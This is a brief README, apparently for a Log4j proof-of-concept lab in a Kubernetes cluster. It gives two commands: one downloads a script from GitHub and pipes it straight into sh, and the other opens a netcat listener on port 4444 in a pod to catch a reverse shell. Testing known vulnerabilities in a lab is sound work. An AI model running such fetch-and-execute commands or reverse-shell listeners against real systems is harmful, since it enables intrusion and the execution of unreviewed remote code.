# log4j-poc in kubernetes environment

Terminal 1
apt-get update && apt-get install -y wget;wget -q -O - https://raw.githubusercontent.com/nandakrr/log4j-poc/main/run.sh | sh

Terminal 2
kubectl exec -it nc-pod -- nc -lvnp 4444
